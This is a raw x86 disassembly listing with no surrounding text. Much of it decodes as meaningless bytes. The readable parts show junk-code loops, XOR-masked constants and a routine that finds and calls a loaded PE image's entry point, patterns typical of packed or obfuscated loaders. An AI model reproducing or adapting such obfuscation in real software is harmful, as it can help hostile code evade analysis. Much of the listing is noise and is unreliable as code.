  411250:	jne    0x4112c6
  411252:	test   DWORD PTR [esi-0x9],esi
  411255:	push   ds
  411256:	cmp    al,0xf0
  411258:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411259:	jmp    0x2329789e
  41125e:	jmp    DWORD PTR [edi-0x376f667c]
  411264:	pop    es
  411265:	jnp    0x41127c
  411267:	mov    bl,0x93
  411269:	sub    al,BYTE PTR [edi]
  41126b:	fld    TBYTE PTR [ebx+edi*4+0x2bc043ed]
  411272:	ret    0xe224
  411275:	mov    eax,esi
  411277:	mov    esi,0x6fc81895
  41127c:	lds    esi,FWORD PTR [eax-0x61ca0fd1]
  411282:	sbb    DWORD PTR [edi+0x783520fb],esp
  411288:	shr    DWORD PTR [eax],0x57
  41128b:	xor    BYTE PTR [ebp-0x611d431a],bh
  411291:	ror    BYTE PTR [ebp-0xe],0xac
  411295:	push   ss
  411296:	and    eax,0x387878d8
  41129b:	pop    edi
  41129c:	or     BYTE PTR [edx],al
  41129e:	sbb    eax,0xd0e80b9f
  4112a3:	cdq    
  4112a4:	cli    
  4112a5:	mov    eax,ds:0x9d4dfc78
  4112aa:	(bad)  
  4112ab:	lods   eax,DWORD PTR ds:[esi]
  4112ac:	mov    edx,0x282f3523
  4112b1:	mov    dl,0x99
  4112b3:	stc    
  4112b4:	div    BYTE PTR [ebx-0x54a148ef]
  4112ba:	jbe    0x411268
  4112bc:	aaa    
  4112bd:	es inc edi
  4112bf:	bound  edx,QWORD PTR [ecx-0x52]
  4112c2:	inc    ebx
  4112c3:	ficomp WORD PTR [ebx-0x557dacff]
  4112c9:	mov    ebx,0xfe72b8a6
  4112ce:	adc    ebx,eax
  4112d0:	xor    eax,0x23de906f
  4112d5:	stos   BYTE PTR es:[edi],al
  4112d6:	mov    ch,0xaa
  4112d8:	rol    BYTE PTR [ebp+0xa],cl
  4112db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112dc:	fwait
  4112dd:	xchg   esi,eax
  4112de:	sub    DWORD PTR [eax],ebx
  4112e0:	enter  0x9b77,0xd
  4112e4:	ret    
  4112e5:	sub    bl,BYTE PTR [eax-0xfcc61a9]
  4112eb:	mov    eax,DWORD PTR [edx+0x194]
  4112f1:	mov    ecx,DWORD PTR [eax]
  4112f3:	mov    eax,DWORD PTR [ecx+0x3c]
  4112f6:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4112fa:	add    eax,ecx
  4112fc:	mov    DWORD PTR [ebp+0x8],esi
  4112ff:	mov    DWORD PTR [ebp+0x10],eax
  411302:	mov    eax,DWORD PTR [ebp+0x10]
  411305:	pop    esi
  411306:	test   eax,eax
  411308:	je     0x41132c
  41130e:	push   DWORD PTR ds:0x414bd6
  411314:	push   DWORD PTR ds:0x414982
  41131a:	mov    eax,DWORD PTR [edx+0x194]
  411320:	push   DWORD PTR [eax]
  411322:	mov    eax,DWORD PTR [ebp+0x10]
  411325:	call   eax
  411327:	jmp    0x41132f
  41132c:	mov    eax,DWORD PTR [ebp+0x10]
  41132f:	leave  
  411330:	ret    0xc
  411333:	push   ebp
  411334:	mov    ebp,esp
  411336:	sub    esp,0x30
  411339:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  411340:	mov    ecx,DWORD PTR ds:0x434603
  411346:	xor    DWORD PTR ds:0x4345cf,ecx
  41134c:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  411353:	mov    DWORD PTR ds:0x4344ff,0x14
  41135d:	cmp    DWORD PTR ds:0x4344ff,0x0
  411364:	je     0x4113b9
  41136a:	cmp    DWORD PTR ds:0x4344ff,0x3
  411371:	jne    0x411387
  411377:	push   0x43477a
  41137c:	push   0x400000
  411381:	call   DWORD PTR ds:0x4130d8
  411387:	cmp    DWORD PTR ds:0x4344ff,0x4
  41138e:	jne    0x41139f
  411394:	mov    eax,ds:0x4344ff
  411399:	dec    eax
  41139a:	mov    ds:0x4344ff,eax
  41139f:	mov    eax,ds:0x4344ff
  4113a4:	dec    eax
  4113a5:	mov    ds:0x4344ff,eax
  4113aa:	jmp    0x41135d
  4113af:	adc    DWORD PTR ds:0x4344ef,0x46ae
  4113b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4113bc:	and    DWORD PTR ds:0x434543,0x0
  4113c6:	jmp    0x4113d6
  4113cb:	mov    eax,ds:0x434543
  4113d0:	inc    eax
  4113d1:	mov    ds:0x434543,eax
  4113d6:	cmp    DWORD PTR ds:0x434543,0x18
  4113dd:	jae    0x411423
  4113e3:	cmp    DWORD PTR ds:0x434543,0xf
  4113ea:	jne    0x411406
  4113f0:	push   0x43457f
  4113f5:	push   0x4743
  4113fa:	push   DWORD PTR [ebp-0x1c]
  4113fd:	push   DWORD PTR [ebp-0x10]
  411400:	call   DWORD PTR ds:0x4132ac
  411406:	cmp    DWORD PTR ds:0x434543,0xe
  41140d:	jne    0x41141e
  411413:	mov    eax,ds:0x434543
  411418:	inc    eax
  411419:	mov    ds:0x434543,eax
  41141e:	jmp    0x4113cb
  411423:	push   ebx
  411424:	mov    eax,0x7510851
  411429:	xor    ecx,eax
  41142b:	and    DWORD PTR ds:0x43460f,0x0
  411435:	mov    ebx,DWORD PTR ds:0x43460f
  41143b:	inc    ebx
  41143c:	mov    DWORD PTR ds:0x43460f,ebx
  411442:	cmp    DWORD PTR ds:0x43460f,0x6
  411449:	jne    0x411462
  41144f:	push   DWORD PTR [ebp-0x10]
  411452:	push   0x434593
  411457:	push   0x4346db
  41145c:	call   DWORD PTR ds:0x413360
  411462:	cmp    DWORD PTR ds:0x43460f,0x5
  411469:	jne    0x41147c
  41146f:	mov    ebx,DWORD PTR ds:0x43460f
  411475:	inc    ebx
  411476:	mov    DWORD PTR ds:0x43460f,ebx
  41147c:	cmp    DWORD PTR ds:0x43460f,0x10
  411483:	jb     0x411435
  411489:	movzx  ebx,WORD PTR ds:0x4344df
  411490:	adc    DWORD PTR ds:0x4345c7,ebx
  411496:	mov    ebx,0x327299
  41149b:	xor    DWORD PTR ds:0x434583,0x577
  4114a5:	add    ecx,ebx
  4114a7:	or     DWORD PTR ds:0x434603,0x4344e7
  4114b1:	mov    DWORD PTR [ebp-0x1c],ecx
  4114b4:	sbb    DWORD PTR ds:0x4345d3,edi
  4114ba:	mov    ecx,DWORD PTR [ebp+0x14]
  4114bd:	xor    DWORD PTR ds:0x4345f7,0x4344f3
  4114c7:	push   esi
  4114c8:	mov    DWORD PTR ds:0x4345cb,0x24af
  4114d2:	push   edi
  4114d3:	sbb    DWORD PTR ds:0x4344ff,0x43453f
  4114dd:	test   ecx,ecx
  4114df:	je     0x41155f
  4114e5:	mov    ecx,DWORD PTR [ebp+0x14]
  4114e8:	sbb    DWORD PTR ds:0x434613,edx
  4114ee:	mov    ecx,DWORD PTR [ecx]
  4114f0:	and    DWORD PTR ds:0x4344ff,0x0
  4114fa:	xor    edi,edi
  4114fc:	or     edi,DWORD PTR ds:0x4344ff
  411502:	inc    edi
  411503:	mov    DWORD PTR ds:0x4344ff,edi
  411509:	cmp    DWORD PTR ds:0x4344ff,0xb
  411510:	jne    0x411529
  411516:	push   0x434607
  41151b:	push   DWORD PTR [ebp-0x28]
  41151e:	push   0x707e
  411523:	call   DWORD PTR ds:0x4132b0
  411529:	cmp    DWORD PTR ds:0x4344ff,0xa
  411530:	jne    0x411545
  411536:	xor    edi,edi
  411538:	add    edi,DWORD PTR ds:0x4344ff
  41153e:	inc    edi
  41153f:	mov    DWORD PTR ds:0x4344ff,edi
  411545:	cmp    DWORD PTR ds:0x4344ff,0x14
  41154c:	jb     0x4114fa
  411552:	mov    DWORD PTR ds:0x4344e7,0x18c9
  41155c:	mov    DWORD PTR [ebp-0x1c],ecx
  41155f:	mov    DWORD PTR ds:0x4344f7,0x1a
  411569:	cmp    DWORD PTR ds:0x4344f7,0x0
  411570:	je     0x4115ca
  411576:	cmp    DWORD PTR ds:0x4344f7,0xb
  41157d:	jne    0x411592
  411583:	push   DWORD PTR [ebp-0x14]
  411586:	push   DWORD PTR [ebp-0x14]
  411589:	push   DWORD PTR [ebp-0x14]
  41158c:	call   DWORD PTR ds:0x4130dc
  411592:	cmp    DWORD PTR ds:0x4344f7,0xc
  411599:	jne    0x4115ac
  41159f:	mov    edi,DWORD PTR ds:0x4344f7
  4115a5:	dec    edi
  4115a6:	mov    DWORD PTR ds:0x4344f7,edi
  4115ac:	mov    edi,DWORD PTR ds:0x4344f7
  4115b2:	dec    edi
  4115b3:	mov    DWORD PTR ds:0x4344f7,edi
  4115b9:	jmp    0x411569
  4115be:	mov    ecx,DWORD PTR ds:0x4344eb
  4115c4:	adc    DWORD PTR ds:0x4344e3,ecx
  4115ca:	imul   edx,eax
  4115cd:	mov    ecx,0x4573
  4115d2:	mov    DWORD PTR ds:0x43460b,0x1d
  4115dc:	cmp    DWORD PTR ds:0x43460b,0x0
  4115e3:	je     0x41162d
  4115e9:	cmp    DWORD PTR ds:0x43460b,0xc
  4115f0:	jne    0x4115ff
  4115f6:	push   DWORD PTR [ebp-0x1c]
  4115f9:	call   DWORD PTR ds:0x4130e0
  4115ff:	cmp    DWORD PTR ds:0x43460b,0xd
  411606:	jne    0x41161b
  41160c:	xor    edi,edi
  41160e:	xor    edi,DWORD PTR ds:0x43460b
  411614:	dec    edi
  411615:	mov    DWORD PTR ds:0x43460b,edi
  41161b:	mov    edi,DWORD PTR ds:0x43460b
  411621:	dec    edi
  411622:	mov    DWORD PTR ds:0x43460b,edi
  411628:	jmp    0x4115dc
  41162d:	add    edx,ecx
  41162f:	jmp    0x41182f
  411634:	rol    DWORD PTR [edi+0x7d4a654a],cl
  41163a:	std    
  41163b:	mov    cl,0xe9
  41163d:	xchg   ebp,eax
  41163e:	inc    edx
  41163f:	jg     0x411686
  411641:	aam    0x3d
  411643:	adc    cl,BYTE PTR [edi+0x597e7e4a]
  411649:	jg     0x4116c9
  41164b:	jle    0x4116bd
  41164d:	xchg   ebx,eax
  41164e:	lea    ebp,[eax+0x7d]
  411651:	xor    dh,ah
  411653:	rcl    BYTE PTR [edi-0x24],cl
  411656:	ret    0x182b
  411659:	ja     0x41160c
  41165b:	scas   eax,DWORD PTR es:[edi]
  41165c:	sar    esp,1
  41165e:	jno    0x411626
  411660:	pop    edx
  411661:	fldcw  WORD PTR [bx+si]
  411664:	dec    edx
  411665:	push   edi
  411666:	addr16 add eax,0xb154e8fa
  41166c:	mov    ebp,0x711b388f
  411671:	inc    edx
  411672:	and    ebx,DWORD PTR [ecx+ecx*4]
  411675:	ret    
  411676:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411677:	add    al,0xf6
  411679:	cwde   
  41167a:	mov    dh,0xe1
  41167c:	test   ecx,esp
  41167e:	mov    bh,0x76
  411680:	jo     0x4116a3
  411682:	clc    
  411683:	es std 
  411685:	add    DWORD PTR ds:[ebx-0x27],ebx
  411689:	jge    0x411638
  41168b:	mov    bl,0xd8
  41168d:	push   ebx
  41168e:	inc    ecx
  41168f:	pop    edx
  411690:	mov    DWORD PTR [eax],edx
  411692:	adc    cl,dh
  411694:	or     cl,BYTE PTR [ebx+eax*2-0x418a6536]
  41169b:	cdq    
  41169c:	in     al,0xb1
  41169e:	add    eax,0x5c2a2761
  4116a3:	lods   al,BYTE PTR ds:[esi]
  4116a4:	data16 (bad) 
  4116a6:	retf   0x4023
  4116a9:	lahf   
  4116aa:	xor    DWORD PTR [edi+0x7b847e95],edi
  4116b0:	bound  edx,QWORD PTR [ecx+eiz*1-0x11abf54b]
  4116b7:	dec    ecx
  4116b8:	ror    eax,1
  4116ba:	jne    0x4116f5
  4116bc:	xor    edx,ebp
  4116be:	(bad)  
  4116bf:	das    
  4116c0:	scas   eax,DWORD PTR es:[edi]
  4116c1:	sbb    al,0xbd
  4116c3:	jmp    0x4116fa
  4116c5:	fnstsw WORD PTR [edi-0xb]
  4116c8:	lods   al,BYTE PTR ds:[esi]
  4116c9:	jnp    0x4116ed
  4116cb:	xchg   esp,eax
  4116cc:	inc    ecx
  4116cd:	ds loope 0x41169f
  4116d0:	jl     0x4116ea
  4116d2:	iret   
  4116d3:	dec    ebp
  4116d4:	lods   al,BYTE PTR ds:[esi]
  4116d5:	xchg   esp,eax
  4116d6:	fidiv  DWORD PTR [ebp+0x6a]
  4116d9:	mov    edx,0x85645c70
  4116de:	fcom   st(6)
  4116e0:	push   ebp
  4116e1:	and    dl,BYTE PTR [edi-0x52]
  4116e4:	lods   al,BYTE PTR ds:[esi]
  4116e5:	and    al,0xb3
  4116e7:	xor    dl,BYTE PTR [eax]
  4116e9:	xor    eax,0x1e249798
  4116ee:	out    dx,al
  4116ef:	push   ebp
  4116f0:	or     BYTE PTR [edx+0x54],0xe4
  4116f4:	push   ebx
  4116f5:	xchg   ebp,eax
  4116f6:	stc    
  4116f7:	hlt    
  4116f8:	pop    esi
  4116f9:	imul   esi,DWORD PTR [ebx+0x36],0xffffffa9
  4116fd:	sbb    ebp,DWORD PTR [ebp+0x2e]
  411700:	sti    
  411701:	test   DWORD PTR [ecx+ebp*2+0x157edf2c],eax
  411708:	or     al,0x80
  41170a:	push   ss
  41170b:	sub    DWORD PTR [eax],edi
  41170d:	mov    esi,0x163a20e3
  411712:	adc    al,0x11
  411714:	in     eax,dx
  411715:	je     0x411796
  411717:	pop    ebp
  411718:	dec    edx
  411719:	cmp    al,0x6a
  41171b:	imul   esp,DWORD PTR [edi+0x2],0xffffffc5
  41171f:	push   0x2
  411721:	and    edi,DWORD PTR [ebp+0x60]
  411724:	dec    edx
  411725:	pop    ds
  411726:	mov    bh,dh
  411728:	cmp    al,0x29
  41172a:	xor    DWORD PTR [edi],0x96ccb897
  411730:	sahf   
  411731:	push   eax
  411732:	in     al,dx
  411733:	pop    edi
  411734:	push   ebp
  411735:	aas    
  411736:	leave  
  411737:	mov    ah,al
  411739:	or     cl,bl
  41173b:	imul   ebp,DWORD PTR ds:[edi+eax*1-0x52],0x1e795e12
  411744:	jle    0x411753
  411746:	test   eax,0x14904658
  41174b:	iret   
  41174c:	cs mov edx,0x5855c310
  411752:	out    dx,al
  411753:	leave  
  411754:	lods   eax,DWORD PTR ds:[esi]
  411755:	bound  edi,QWORD PTR [esi]
  411757:	nop
  411758:	call   0x8bcc:0xe88dde77
  41175f:	sub    ebx,DWORD PTR [edi+0x481bd0c6]
  411765:	dec    esp
  411766:	mov    ebx,0x307fa706
  41176b:	(bad)  
  41176c:	mov    esi,0xe46887c0
  411771:	add    eax,0xac8eb79
  411776:	fcmovbe st,st(0)
  411778:	sar    DWORD PTR [ebp+0x5a],0x18
  41177c:	fisttp QWORD PTR [ecx+0x36]
  41177f:	sub    al,0xe3
  411781:	mov    al,ds:0x398c702d
  411786:	lds    ebx,FWORD PTR [esi+ebx*4]
  411789:	inc    esi
  41178a:	ds je  0x411791
  41178d:	arpl   WORD PTR [edi-0x18],sp
  411790:	jnp    0x4117ff
  411792:	popa   
  411793:	jo     0x411796
  411795:	sbb    ah,BYTE PTR [esi]
  411797:	call   0xed18365f
  41179c:	das    
  41179d:	jns    0x411720
  41179f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117a0:	add    DWORD PTR [edi-0x26d2c524],0x4
  4117a7:	nop
  4117a8:	(bad)  
  4117aa:	mov    ecx,0x28c678c8
  4117af:	lds    eax,FWORD PTR [ecx]
  4117b1:	arpl   ax,bp
  4117b3:	cmp    eax,DWORD PTR [edi]
  4117b5:	retf   
  4117b6:	mov    WORD PTR [edi],es
  4117b8:	hlt    
  4117b9:	daa    
  4117ba:	mov    ecx,0x182a37ee
  4117bf:	jle    0x41183d
  4117c1:	js     0x41182c
  4117c3:	popf   
  4117c4:	mov    ah,BYTE PTR [ecx+0x14]
  4117c7:	inc    esi
  4117c8:	push   ecx
  4117c9:	jb     0x6bfa2b39
  4117cf:	jbe    0x411764
  4117d1:	nop
  4117d2:	sbb    al,0x37
  4117d4:	repnz mov ebx,0xaa0b3528
  4117da:	jns    0x41177a
  4117dc:	(bad)  
  4117dd:	nop
  4117de:	cmp    ah,BYTE PTR [ebx+0x52]
  4117e1:	push   0x35f90d2b
  4117e6:	ret    
  4117e7:	mov    edi,0x1fdd823b
  4117ec:	stos   BYTE PTR es:[edi],al
  4117ed:	mov    al,0x15
  4117ef:	xlat   BYTE PTR ds:[ebx]
  4117f0:	and    esi,esp
  4117f2:	dec    edx
  4117f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117f4:	mov    ds:0xc51d65be,al
  4117f9:	in     al,dx
  4117fa:	call   0xef209309
  4117ff:	out    dx,al
  411800:	sti    
  411801:	adc    eax,0xc5567866
  411806:	push   cs
  411807:	sub    al,0x56
  411809:	les    edi,FWORD PTR [eax]
  41180b:	cmp    eax,0x78f7a5d2
  411810:	cli    
  411811:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411812:	dec    esp
  411813:	mov    edx,0x5b59ff
  411818:	out    0x9a,al
  41181a:	int3   
  41181b:	(bad)  
  41181c:	sti    
  41181d:	xchg   DWORD PTR [ebp-0x63df291e],ebx
  411823:	push   edi
  411824:	scas   eax,DWORD PTR es:[edi]
  411825:	ins    BYTE PTR es:[edi],dx
  411826:	in     eax,0x0
  411828:	idiv   cl
  41182a:	mov    dl,0x20
  41182c:	into   
  41182d:	fimul  WORD PTR [esi+edi*4]
  411830:	jns    0x4118aa
  411832:	add    BYTE PTR [eax],al
  411834:	or     edi,0x33cc
  41183a:	mov    edi,0x1556
  41183f:	jmp    0x411a3f
  411844:	retf   0x898a
  411847:	outs   dx,DWORD PTR ds:[esi]
  411848:	dec    ecx
  411849:	jne    0x41183f
  41184b:	stos   DWORD PTR es:[edi],eax
  41184c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41184d:	loope  0x411863
  41184f:	lods   al,BYTE PTR ds:[esi]
  411850:	fnstsw WORD PTR [eax+0x54ea60b5]
  411856:	jle    0x4118d6
  411858:	pop    ecx
  411859:	jg     0x4118d9
  41185b:	jle    0x411883
  41185d:	daa    
  41185e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41185f:	iret   
  411860:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  411862:	inc    edx
  411863:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411864:	or     al,0x45
  411866:	int3   
  411867:	std    
  411868:	jp     0x4118e3
  41186a:	in     al,0x63
  41186c:	jmp    0x7dc9d8dd
  411871:	sar    DWORD PTR [edi-0x561cef26],cl
  411877:	sbb    esi,DWORD PTR [eax+0x7283e483]
  41187d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41187e:	outs   dx,BYTE PTR ds:[esi]
  41187f:	in     al,dx
  411880:	out    0xac,eax
  411882:	inc    DWORD PTR [eax-0x2a0c1690]
  411888:	loopne 0x411898
  41188a:	fyl2x  
  41188c:	je     0x4118a4
  41188e:	mov    ah,0xd
  411890:	dec    esp
  411891:	out    dx,al
  411892:	stc    
  411893:	jns    0x411880
  411895:	outs   dx,DWORD PTR ds:[esi]
  411896:	sbb    BYTE PTR [ebp+ecx*2+0x39b829a5],dh
  41189d:	xor    esp,eax
  41189f:	push   0x15000d89
  4118a4:	inc    edx
  4118a5:	cli    
  4118a6:	mov    bh,0x66
  4118a8:	sub    ebx,edi
  4118aa:	dec    ebp
  4118ab:	push   eax
  4118ac:	push   ebp
  4118ad:	int3   
  4118ae:	mov    ch,0x88
  4118b0:	imul   ebp,DWORD PTR [eax+0x4d3c18d7],0x40
  4118b7:	scas   al,BYTE PTR es:[edi]
  4118b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118b9:	ja     0x411852
  4118bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118bc:	aam    0xf2
  4118be:	(bad)  
  4118bf:	addr16 ret 
  4118c1:	or     ebx,edi
  4118c3:	jb     0x4118d5
  4118c5:	in     eax,0x28
  4118c7:	and    BYTE PTR [esi],dl
  4118c9:	es daa 
  4118cb:	in     al,0x5d
  4118cd:	or     ebx,DWORD PTR [ecx]
  4118cf:	xor    al,0x50
  4118d1:	pmaxsw mm3,QWORD PTR [edi+0x4b20fbe6]
  4118d8:	ror    BYTE PTR [ecx],cl
  4118da:	mov    fs,WORD PTR [ebx+edi*1-0x573a2898]
  4118e1:	imul   edx,esi,0x70
  4118e4:	xchg   ebx,eax
  4118e5:	jmp    0x4118e9
  4118e7:	in     al,dx
  4118e8:	cld    
  4118e9:	adc    eax,0x903a3b70
  4118ee:	aas    
  4118ef:	jge    0x411876
  4118f1:	cld    
  4118f2:	fmul   DWORD PTR [esi]
  4118f4:	jle    0x4118e9
  4118f6:	cld    
  4118f7:	jmp    0xf0a7:0xb188a1c1
  4118fe:	mov    eax,ds:0x202722f4
  411903:	retf   
  411904:	sub    BYTE PTR [ebp-0x59],al
  411907:	cmp    BYTE PTR [edi-0xf],bl
  41190a:	(bad)  
  41190c:	lahf   
  41190d:	mov    al,0x90
  41190f:	nop
  411910:	sbb    DWORD PTR [eax+0x6b08242],ebp
  411916:	scas   al,BYTE PTR es:[edi]
  411917:	jl     0x41197d
  411919:	push   eax
  41191a:	(bad)  
  41191b:	fs in  eax,0x9f
  41191e:	xchg   DWORD PTR [edi+0x31],edi
  411921:	test   edi,0xb8257f14
  411927:	dec    esi
  411928:	xchg   ecx,eax
  411929:	imul   eax,DWORD PTR [edi],0xa41bb4fb
  41192f:	retf   0x1fba
  411932:	mov    ah,0x90
  411934:	or     edx,DWORD PTR [ebx]
  411936:	ins    DWORD PTR es:[edi],dx
  411937:	cmp    DWORD PTR [eax],ebx
  411939:	mov    ebx,0xf36ee5d7
  41193e:	mov    dh,0xaa
  411940:	mov    eax,0xad13d2d2
  411945:	ret    0x1e61
  411948:	mov    dl,cl
  41194a:	ins    DWORD PTR es:[edi],dx
  41194b:	inc    esp
  41194c:	js     0x411992
  41194e:	daa    
  41194f:	push   eax
  411950:	lock dec eax
  411952:	push   ss
  411953:	pop    es
  411954:	push   ebp
  411955:	iret   
  411956:	inc    ebp
  411957:	loope  0x4118f6
  411959:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41195a:	inc    ecx
  41195b:	jbe    0x411913
  41195d:	jno    0x41192f
  41195f:	sub    ebx,DWORD PTR [ebp-0x32]
  411962:	pop    edx
  411963:	mov    dl,BYTE PTR [esp+edi*4-0x71b2ad37]
  41196a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41196b:	jns    0x4119ea
  41196d:	xor    ecx,ebp
  41196f:	push   es
  411970:	imul   edi,DWORD PTR ds:0xbba5dac0,0xffffff93
  411977:	cmp    DWORD PTR [esi],edx
  411979:	loope  0x41193d
  41197b:	add    BYTE PTR [ecx+0x21bb137b],dl
  411981:	aas    
  411982:	fs das 
  411984:	mov    ds:0x7cc50d7a,al
  411989:	fimul  WORD PTR [edx+0x7f]
  41198c:	xchg   esp,eax
  41198d:	and    BYTE PTR [ecx],ch
  41198f:	or     DWORD PTR [ecx+0x31318163],0x6d
  411996:	bound  edx,QWORD PTR [edx-0x41]
  411999:	cmp    cl,BYTE PTR [edx-0x4f171664]
  41199f:	adc    DWORD PTR [esi+0x23489bc0],esi
  4119a5:	(bad)  
  4119a6:	jmp    0x6f91:0x5b8cdb99
  4119ad:	adc    edx,DWORD PTR [ecx+ecx*8+0x6a8bbecc]
  4119b4:	test   eax,0xec9404e
  4119b9:	sbb    cl,bl
  4119bb:	add    al,0xdb
  4119bd:	outs   dx,BYTE PTR ds:[esi]
  4119be:	add    BYTE PTR [edi+esi*1-0x76503b53],al
  4119c5:	imul   esp,DWORD PTR [esi+0x4f],0x49
  4119c9:	pop    ds
  4119ca:	sub    ch,BYTE PTR [eax-0x11826723]
  4119d0:	test   al,0xeb
  4119d2:	or     ecx,DWORD PTR [edx]
  4119d4:	test   al,0x2b
  4119d6:	int    0xbf
  4119d8:	retf   0x641d
  4119db:	enter  0x411b,0xcc
  4119df:	sbb    bl,BYTE PTR [edi]
  4119e1:	outs   dx,BYTE PTR ds:[esi]
  4119e2:	mov    cl,0x85
  4119e4:	int    0x9e
  4119e6:	mov    al,ds:0x75762169
  4119eb:	push   esp
  4119ec:	pop    ds
  4119ed:	scas   al,BYTE PTR es:[edi]
  4119ee:	push   cs
  4119ef:	inc    esp
  4119f0:	mov    WORD PTR [ebx],?
  4119f2:	addr16 jg 0x4119a6
  4119f5:	mov    ds:0x7f60f55d,al
  4119fa:	sub    DWORD PTR [edx+0x3a],edi
  4119fd:	mov    ch,0xb1
  4119ff:	dec    esp
  411a00:	sbb    al,0x8d
  411a02:	mov    BYTE PTR [edi+0x2a30b0c6],bl
  411a08:	and    dl,dh
  411a0a:	inc    ebp
  411a0b:	mov    ds:0x99f00c56,al
  411a10:	mov    esp,0xa2607784
  411a15:	sub    ah,BYTE PTR [esp+edi*1]
  411a18:	(bad)  [esi-0x16]
  411a1b:	loope  0x4119e6
  411a1d:	jbe    0x411a8d
  411a1f:	mov    al,al
  411a21:	fs (bad) 
  411a24:	push   ebx
  411a25:	push   cs
  411a26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a27:	jg     0x411a56
  411a29:	frstor [ebx-0x20]
  411a2c:	inc    edi
  411a2d:	aaa    
  411a2e:	mov    ch,0x3c
  411a30:	jo     0x411a9b
  411a32:	cld    
  411a33:	popa   
  411a34:	sub    BYTE PTR es:[ecx+0xd],al
  411a38:	inc    ebp
  411a39:	adc    esp,DWORD PTR [eax-0xd]
  411a3c:	or     BYTE PTR [ebx],dh
  411a3e:	xor    eax,DWORD PTR [edi+0x33d72bce]
  411a44:	or     eax,0x434577
  411a49:	xor    esi,esi
  411a4b:	adc    DWORD PTR ds:0x4344f7,edi
  411a51:	mov    DWORD PTR [ebp-0x28],esi
  411a54:	mov    DWORD PTR [ebp-0x2c],esi
  411a57:	dec    DWORD PTR ds:0x4345cf
  411a5d:	mov    DWORD PTR [ebp-0x14],esi
  411a60:	mov    DWORD PTR [ebp-0x8],esi
  411a63:	mov    ecx,DWORD PTR [ebp-0x18]
  411a66:	add    DWORD PTR ds:0x4345cf,0x3520
  411a70:	xor    ecx,eax
  411a72:	xor    edi,edi
  411a74:	add    ecx,ebx
  411a76:	mov    DWORD PTR [ebp-0x20],ecx
  411a79:	mov    DWORD PTR ds:0x434537,ebx
  411a7f:	mov    eax,DWORD PTR [ebp-0x20]
  411a82:	mov    DWORD PTR ds:0x4344ff,0x2abf
  411a8c:	je     0x4122b7
  411a92:	adc    DWORD PTR ds:0x4344eb,0x60fd
  411a9c:	mov    eax,DWORD PTR [ebp-0x4]
  411a9f:	adc    DWORD PTR ds:0x434553,0x6e6
  411aa9:	xor    eax,0x7510851
  411aae:	or     DWORD PTR ds:0x4345c3,0x43457b
  411ab8:	add    eax,ebx
  411aba:	mov    DWORD PTR ds:0x434613,0x35f1
  411ac4:	cmp    edi,eax
  411ac6:	jne    0x411c5a
  411acc:	sbb    DWORD PTR ds:0x4344f3,0x4344e7
  411ad6:	push   DWORD PTR [ebp+0x8]
  411ad9:	or     DWORD PTR ds:0x43460f,0x4345cb
  411ae3:	call   0x4104be
  411ae8:	and    ecx,DWORD PTR ds:0x43454f
  411aee:	mov    DWORD PTR [ebp-0x20],eax
  411af1:	mov    eax,DWORD PTR [ebp-0x4]
  411af4:	mov    ecx,DWORD PTR [ebp-0x20]
  411af7:	and    DWORD PTR ds:0x4345b7,0x0
  411b01:	mov    esi,DWORD PTR ds:0x4345b7
  411b07:	inc    esi
  411b08:	mov    DWORD PTR ds:0x4345b7,esi
  411b0e:	cmp    DWORD PTR ds:0x4345b7,0x1e
  411b15:	jne    0x411b26
  411b1b:	push   0x1cd9
  411b20:	call   DWORD PTR ds:0x4132b4
  411b26:	cmp    DWORD PTR ds:0x4345b7,0x18
  411b2d:	jb     0x411b01
  411b33:	mov    esi,0x7510851
  411b38:	xor    eax,esi
  411b3a:	add    eax,ebx
  411b3c:	cmp    ecx,eax
  411b3e:	je     0x411e9b
  411b44:	or     DWORD PTR ds:0x4345b7,0x434577
  411b4e:	push   DWORD PTR [ebp-0x20]
  411b51:	push   DWORD PTR [ebp+0x8]
  411b54:	sub    DWORD PTR ds:0x434537,0x4344e7
  411b5e:	call   0x404d31
  411b63:	movzx  ecx,WORD PTR ds:0x4345b7
  411b6a:	and    ecx,DWORD PTR ds:0x43458b
  411b70:	mov    DWORD PTR ds:0x4345b7,ecx
  411b76:	mov    DWORD PTR [ebp-0x14],eax
  411b79:	mov    DWORD PTR ds:0x43460f,0x13
  411b83:	cmp    DWORD PTR ds:0x43460f,0x0
  411b8a:	je     0x411bc6
  411b90:	cmp    DWORD PTR ds:0x43460f,0x22
  411b97:	jne    0x411bad
  411b9d:	push   0x434710
  411ba2:	push   0x4346b5
  411ba7:	call   DWORD PTR ds:0x4130e4
  411bad:	xor    eax,eax
  411baf:	or     eax,DWORD PTR ds:0x43460f
  411bb5:	dec    eax
  411bb6:	mov    ds:0x43460f,eax
  411bbb:	jmp    0x411b83
  411bc0:	add    DWORD PTR ds:0x4344eb,edx
  411bc6:	mov    eax,DWORD PTR [ebp-0x4]
  411bc9:	mov    DWORD PTR ds:0x4345cb,0x10
  411bd3:	cmp    DWORD PTR ds:0x4345cb,0x0
  411bda:	je     0x411c1c
  411be0:	cmp    DWORD PTR ds:0x4345cb,0x1b
  411be7:	jne    0x411c0a
  411bed:	push   DWORD PTR [ebp-0x20]
  411bf0:	push   0x4372
  411bf5:	push   0x4347d5
  411bfa:	push   0x4347e9
  411bff:	push   0x7ff3
  411c04:	call   DWORD PTR ds:0x4130e8
  411c0a:	mov    ecx,DWORD PTR ds:0x4345cb
  411c10:	dec    ecx
